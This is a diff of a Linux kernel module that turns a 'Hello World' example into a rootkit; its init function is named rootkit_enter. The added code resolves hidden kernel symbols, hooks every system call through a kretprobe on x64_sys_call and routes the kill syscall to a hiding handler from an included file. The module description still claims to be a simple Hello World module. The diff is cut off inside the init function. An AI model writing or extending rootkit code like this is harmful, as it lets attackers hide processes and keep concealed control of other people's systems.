@@ -1,44 +1,49 @@
-// hello_world.c
 #include <linux/kprobes.h>
 #include <linux/module.h>
+#include <linux/fs.h>
+#include "syscall_metadata.h"
+#include "get_kln.h"
+#include "hide.c"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Your Name");
 MODULE_DESCRIPTION("A simple Hello World Kernel Module");
 
 
+struct filename* (*mgetname)(char* __user data);
+void (*mputname)(struct filename* data);
+
 struct kretprobe kp;
+
+kln_p klookup_name;
 
 static int syscall_entry(struct kretprobe_instance* k , struct pt_regs* regs){
   struct pt_regs* syscall_regs = (struct pt_regs*)regs->di;
+  struct syscall_metadata* data = (struct syscall_metadata*)k->data;
+  data->syscall = UNKNOWN;
 
   int syscall_number = *(int*) &syscall_regs->orig_ax;
-  /* printk(KERN_INFO "Syscal ran: %d\n",syscall_number); */
-  if (syscall_number == 83) {
-    printk(KERN_INFO "Mkdir ran: %d\n",syscall_number);
+  if (syscall_number == 62) {
+    hide_handler(syscall_regs);
   }
 
-  /* char* __user pathname = (char* )syscall_regs->di; */
-  /* char buf[256]; */
-  /* long n = strncpy_from_user(buf, pathname, 256); */
-  /* printk(KERN_INFO "%ld %s\n",n,buf); */
-  /* if (strcmp(buf,"hello") == 0) { */
-  /*   int n = copy_to_user(pathname, "hi", 3); */
-  /*   printk(KERN_INFO "Copying hi :) %d\n",n); */
-  /* } */
-
-  
-
   return 0;
 }
-
+ 
 static int syscall_exit(struct kretprobe_instance* k , struct pt_regs* regs) {
+  struct syscall_metadata* data = (struct syscall_metadata*)k->data;
   return 0;
 }
+
 
 static int __init rootkit_enter(void) {
+  klookup_name = get_kln_p();
+  mgetname = (void*)klookup_name("getname");
+  mputname = (void*)klookup_name("putname");
+
+
   kp.kp.symbol_name = "x64_sys_call";
-  kp.data_size = 0;
+  kp.data_size = sizeof(struct syscall_metadata);
   kp.maxactive = 1000;
 
   kp.entry_handler = &syscall_entry;
